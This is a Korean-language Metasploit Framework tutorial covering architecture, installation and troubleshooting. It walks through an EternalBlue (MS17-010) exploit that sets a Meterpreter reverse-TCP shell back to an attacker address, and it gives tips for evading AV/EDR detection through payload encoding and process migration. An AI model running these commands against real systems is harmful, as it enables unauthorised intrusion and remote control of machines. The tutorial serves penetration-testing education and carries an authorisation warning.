1. Metasploit Framework란?

Metasploit Framework(MSF)는 침투 테스트(Penetration Testing) 및 취약점 연구를 위한 오픈 소스 플랫폼입니다. 취약점 탐지, 익스플로잇 개발, 페이로드 생성, 포스트 익스플로잇까지 통합된 워크플로우를 제공합니다.

📦 모듈성

Exploit, Payload, Auxiliary, Encoder, Post 등 모듈화된 구조로 확장성과 재사용성이 뛰어납니다. Python/Ruby로 커스텀 모듈 작성 가능.

⚙️ 자동화

반복적인 테스트 작업을 자동화하고, Resource Script(.rc)를 통해 복잡한 공격 시나리오를 배치 실행할 수 있습니다.

🔗 통합 생태계

Nmap, Nessus 결과 연동, Meterpreter 세션 관리, C2(Command & Control) 통합 등 레드팀 운영의 핵심 도구입니다.

2. 왜 써야 하는가? (기존 대안 비교)

다양한 익스플로잇 도구가 존재하지만, MSF는 포괄성과 커뮤니티 지원에서 차별화됩니다.

도구 / 프레임워크 주요 특징 Metasploit 대비 장단점
Metasploit Framework 통합 플랫폼, 대규모 모듈 DB, GUI/CLI 지원, 활발한 커뮤니티 장점: 가장 포괄적, 문서화 잘됨, 레드팀 표준
단점: 무겁고, 탐지 쉬움(Signature)
Cobalt Strike 상용 레드팀 툴, 고급 C2, 협업 기능, 에뮬레이션 장점: 은닉성, 협업 툴
단점: 비용, 오픈 소스 아님
Core Impact / Canvas 상용 통합 펜테스트 플랫폼 장점: 엔터프라이즈 지원
단점: 고가, 폐쇄적
자체 제작 스크립트 Python, PowerShell 등으로 특정 공격 맞춤 제작 장점: 정밀함, 탐지 회피 가능
단점: 개발/유지보수 비용, 재사용성 낮음
💡 선택 가이드: 빠른 프로토타이핑, 교육, 표준화된 테스트에는 MSF. 고객 맞춤형, 은닉성이 중요한 운영에는 Cobalt Strike나 자체 툴을 고려하세요.

3. 핵심 개념과 아키텍처

MSF는 계층적 아키텍처로 설계되어 사용자 인터페이스(CLI/GUI)부터 저수준 익스플로잇 실행까지 분리됩니다.

┌─────────────────────────────────────────────────────────────┐ │ User Interface Layer │ │ (msfconsole, msfcli, Armitage, Web UI, Python API) │ └────────────────────────────┬────────────────────────────────┘ │ ┌────────────────────────────▼────────────────────────────────┐ │ Framework Core (Ruby) │ │ - Module Management (Exploit, Payload, Auxiliary...) │ │ - Session Management (Meterpreter, Shell, VNC...) │ │ - Job & Resource Scheduling │ └────────────────────────────┬────────────────────────────────┘ │ ┌────────────────────────────▼────────────────────────────────┐ │ Rex (Ruby Extension) Library │ │ - Protocol Handling (HTTP, SMB, SSH, ...) │ │ - Encoding/Encryption │ │ - Socket Abstraction │ └────────────────────────────┬────────────────────────────────┘ │ ┌────────────────────────────▼────────────────────────────────┐ │ Module & Plugin Ecosystem │ │ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │ │ │ Exploit │ │ Payload │ │Auxiliary │ │ Post │ ... │ │ │ Modules │ │ Modules │ │ Modules │ │ Modules │ │ │ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │ └─────────────────────────────────────────────────────────────┘

주요 컴포넌트

  • msfconsole: 가장 강력한 CLI 인터페이스. 대화형 환경 제공.
  • Meterpreter: 고급 메모리 상 주입 페이로드. 파일 시스템, 키로깅, 권한 상승 등 확장 기능.
  • Database: PostgreSQL와 연동해 작업 결과, 호스트, 서비스 정보를 구조화.
  • Resource Script (.rc): 자동화 스크립트. msfconsole -r script.rc

4. 퀵스타트: 설치부터 첫 Exploit까지

단계 1: 설치 (Kali Linux / Ubuntu 기준)

# Kali에는 기본 설치됨. 업데이트:
sudo apt update && sudo apt install metasploit-framework -y

# Ubuntu/Debian 설치:
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall

단계 2: 데이터베이스 설정 (선택, 권장)

# PostgreSQL 서비스 시작
sudo systemctl start postgresql
sudo systemctl enable postgresql

# MSF 데이터베이스 초기화
sudo msfdb init

# 상태 확인
msfconsole -q
msf6 > db_status
[*] postgresql connected to msf

단계 3: 첫 번째 Exploit 실행 (예: EternalBlue MS17-010)

# msfconsole 실행
sudo msfconsole -q

# 익스플로잇 모듈 검색 및 사용
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 필수 옵션 설정 (RHOSTS는 타겟 IP)
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.10  # 공격자 IP
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444

# 익스플로잇 실행
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.10:4444
[*] 192.168.1.100:445 - Connecting to target for exploitation...
[+] 192.168.1.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
...
⚠️ 주의: 이 예제는 합법적으로 소유하거나 허가받은 환경에서만 실행하세요. 무단 테스트는 법적 문제를 일으킬 수 있습니다.

단계 4: Python을 통한 간단한 자동화 예제

#!/usr/bin/env python3
"""
Metasploit RPC API를 이용한 Python 자동화 예제
(msfrpcd 데몬이 실행 중이어야 함)
"""
import msfrpc

# 클라이언트 생성
client = msfrpc.Msfrpc({})
client.login('msf', 'password')  # msfrpcd 자격 증명

# 콘솔 생성
console_id = client.call('console.create')['id']

# 명령어 실행: Nmap 스캔
cmd = "db_nmap -sV -O 192.168.1.0/24"
client.call('console.write', [console_id, cmd])

# 결과 읽기
import time
time.sleep(30)  # 스캔 대기
result = client.call('console.read', [console_id])
print(result['data'])

# 호스트 목록 조회
hosts = client.call('host.list')
print(f"발견된 호스트: {len(hosts)}")

5. 핵심 설정 레퍼런스

설정 항목 기본값 / 예시 설명 관련 명령어
Database 연결 postgresql://msf:msf@127.0.0.1/msf 작업 결과 저장. 필수는 아니지만 실무에서 강력 권장. db_status, workspace
LHOST / LPORT 192.168.1.10 / 4444 리버스 쉘/커넥션을 받을 공격자 주소와 포트. set LHOST, set LPORT
PAYLOAD windows/x64/meterpreter/reverse_tcp 익스플로잇 성공 후 실행될 페이로드. 타겟 OS/아키텍처에 맞춰 선택. show payloads
Exploit Target 0 (Auto) 다중 타겟 익스플로잇에서 특정 OS/버전 지정. show targets, set TARGET
Session 통신 HTTP / HTTPS / TCP Meterpreter 세션 통신 프로토콜. 방화벽 우회 시 변경. set PAYLOAD .../reverse_http
AutoRunScript post/windows/manage/migrate 세션 획득 시 자동 실행할 스크립트. 프로세스 마이그레이션 등. set AutoRunScript
VERBOSE false 상세 출력 모드. 디버깅 시 true로 설정. set VERBOSE true

6. 실무 팁 & 트러블슈팅

🚀 성능 팁

  • 데이터베이스 사용: 모든 스캔/익스플로잇 결과를 DB에 저장해 후속 분석 속도 향상.
  • Resource Script: 반복 작업은 .rc 파일로 자동화. msfconsole -r auto.rc
  • 세션 관리: 백그라운드 세션(background) 활용해 다중 타겟 동시 작업.

🛡️ 탐지 회피

  • 페이로드 인코딩: msfvenom으로 시그니처 변조. 다중 인코딩 적용.
  • Meterpreter 통신 암호화: HTTPS, XOR 동적 암호화 사용.
  • 세션 마이그레이션: 취득 즉시 migrate로 프로세스 이동.

자주 겪는 문제 & 해결책

문제 원인 해결책
"Exploit failed: No target was specified." 타겟 옵션(TARGET)이 설정되지 않음. show targets로 가능한 타겟 확인 후 set TARGET <id>
Meterpreter 세션 바로 종료 AV/EDR 탐지, 방화벽에서 아웃바운드 연결 차단. 인코딩 적용, 통신 포트/프로토콜 변경(예: 443 HTTPS), staged payload 사용.
db_nmap 결과가 데이터베이스에 안 뜸 데이터베이스 연결 안됨 또는 workspace 문제. db_status 확인, workspace -a new_workspace로 새 작업공간 생성.
익스플로잇은 성공했으나 세션 없음 페이로드와 타겟 아키텍처 불일치, 메모리 보호(ASLR, DEP). 페이로드 아키텍처 확인(x86/x64), 마이그레이션 옵션 설정, 다른 페이로드 시도.
msfconsole 시작 시 Ruby 오류 Gem 라이브러리 충돌 또는 손상된 설치. sudo gem cleanup, 또는 sudo apt reinstall metasploit-framework
📝 로깅 & 디버깅: 문제 발생 시 set VERBOSE true로 상세 출력을 확인하고, logs 디렉토리에서 프레임워크 로그를 검토하세요.
